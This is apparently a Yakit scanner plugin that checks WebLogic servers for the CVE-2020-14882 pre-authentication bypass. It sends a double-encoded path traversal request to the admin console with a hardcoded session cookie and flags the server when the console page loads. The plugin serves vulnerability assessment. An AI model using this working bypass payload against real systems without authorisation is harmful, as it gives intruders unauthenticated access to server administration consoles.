# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    cookie = "ADMINCONSOLESESSION=1pKpjmx4xN81slNDVOc9vVoROip6WNuTZEwdJyPUrNVWI8ieI8G2!1447208077"

    packet = `
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Cookie: {{params(cookie)}}
Pragma: no-cache
Upgrade-Insecure-Requests: 1

`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"cookie":cookie}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)

    drsp, derr = str.ParseBytesToHTTPResponse(rsp)
    if derr != nil {
        yakit.Error(string(derr))
        return
    }

    if drsp.StatusCode == 302 && str.MatchAllOfSubString(hand, `console.portal?_nfpb=true`) {
        cookie = re.FindAll(hand, `ADMINCONSOLESESSION=\s*\S*`)[0]
        rsp,req,_ = poc.HTTP(packet, 
        poc.params({"target":addr,"cookie":cookie}),
        poc.https(isTls),
        poc.redirectTimes(0),
        )
        hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        drsp, derr = str.ParseBytesToHTTPResponse(rsp)
        if derr != nil {
            yakit.Error(string(derr))
            return
        }
    }

    // dump(rsp)
    if len(rsp) > 0 {
        if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `product-brand-name`) {
            yakit.Info("%v Weblogic 预身份验证绕过（CVE-2020-14882）", addr)
            risk.NewRisk(
                addr,risk.title("Weblogic Pre-Auth bypass(CVE-2020-14882)"),
                risk.severity("high"),
                risk.titleVerbose("Weblogic 预身份验证绕过（CVE-2020-14882）存在"),
                risk.type("未授权访问[Weblogic]"),
                risk.payload(`/console/css/%252e%252e%252fconsole.portal`),
            )
        }
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/console/css/%252e%252e%252fconsole.portal`

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "weblogic") {
            handleCheck(result.Target,result.Port)
        }
    }
    
}
